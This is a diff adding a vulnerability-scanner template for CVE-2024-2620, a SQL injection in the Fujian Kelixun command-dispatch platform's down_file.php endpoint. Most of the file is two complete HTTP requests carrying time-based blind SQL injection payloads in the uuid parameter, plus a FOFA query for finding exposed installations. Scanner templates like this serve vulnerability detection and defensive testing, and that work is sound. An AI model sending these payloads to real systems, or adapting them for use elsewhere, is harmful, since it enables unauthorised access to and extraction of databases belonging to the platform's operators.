@@ -1,0 +1,37 @@
+id: kelixun-sql-injection
+info:
+  name: 福建科立迅通信指挥调度平台 down_file.php 接口 SQL注入漏洞
+  author: 0dayPoc
+  severity: high
+  description: |-
+    fofa: body="app/structure/departments.php" || app="指挥调度管理平台"
+      福建科立迅通信调度平台在 20240318 及之前版本中，api/client/down_file.php 接口的 uuid 参数未正确过滤特殊字符，导致攻击者可通过构造恶意输入执行任意 SQL 语句。该漏洞允许远程攻击者在未授权情况下操控数据库查询逻辑，可能造成数据泄露或服务异常。
+  reference:
+  - CVE-2024-2620
+  tags: 福建科立迅通信指挥调度平台
+http:
+- raw:
+  - |
+    GET /api/client/down_file.php?uuid=1%27%20AND%20(SELECT%205587%20FROM%20(SELECT(SLEEP(5)))pwaA)%20AND%20%27dDhF%27=%27dDhF HTTP/1.1
+    Host: {{Hostname}}
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+    Accept-Encoding: gzip, deflate, br
+    Connection: close
+    Cookie: PHPSESSID=d62411cd4ada228583bbcae45f099567; authcode=uksj
+    Upgrade-Insecure-Requests: 1
+  - |
+    GET /api/client/down_file.php?uuid=1%27%20AND%20(SELECT%205587%20FROM%20(SELECT(SLEEP(8)))pwaA)%20AND%20%27dDhF%27=%27dDhF HTTP/1.1
+    Host: {{Hostname}}
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+    Accept-Encoding: gzip, deflate, br
+    Connection: close
+    Cookie: PHPSESSID=d62411cd4ada228583bbcae45f099567; authcode=uksj
+    Upgrade-Insecure-Requests: 1
+  matchers:
+  - type: dsl
+    dsl:
+    - duration_1>=5 && duration_1<=6
+    - duration_2>=8 && duration_2<=9
+    condition: and
